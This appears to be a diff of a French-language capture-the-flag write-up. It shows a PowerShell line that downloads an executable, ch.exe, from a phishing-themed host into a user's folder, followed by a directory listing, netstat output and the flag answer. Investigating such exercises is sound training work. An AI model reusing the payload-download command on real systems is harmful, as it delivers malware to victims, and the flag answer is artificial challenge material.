@@ -118,7 +118,31 @@ powershell iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Do
 
 Mode                LastWriteTime         Length Name                                                                   
 ----                -------------         ------ ----                                                                   
--a----        6/21/2022   1:17 AM        8230912 ch.exe                                                                 
+-a----        6/21/2022   1:17 AM        8230912 ch.exe
+
+netstat -ano -p tcp
+
+  Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       864
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5508
+  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       4964
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       476
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1212
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1660
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2424
+  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:49676          0.0.0.0:0              LISTENING       608
+  TCP    192.168.254.107:139    0.0.0.0:0              LISTENING       4
+  TCP    192.168.254.107:...    ...:80                 TIME_WAIT       0
+  TCP    192.168.254.107:51858  104.101.22.128:80      TIME_WAIT       0
+  TCP    192.168.254.107:51860  20.205.146.149:443     TIME_WAIT       0
+  TCP    192.168.254.107:51861  204.79.197.200:443     ESTABLISHED     4352                                                           
 
 ```
 réponse : infernotempest
